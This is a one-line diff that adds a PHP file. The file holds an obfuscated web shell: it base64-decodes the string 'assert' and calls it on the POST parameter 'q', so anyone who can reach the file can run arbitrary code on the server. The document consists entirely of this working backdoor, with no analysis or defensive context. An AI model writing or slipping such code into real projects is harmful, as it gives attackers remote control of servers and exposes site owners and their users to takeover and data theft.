@@ -1,0 +1,1 @@
+<?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?>
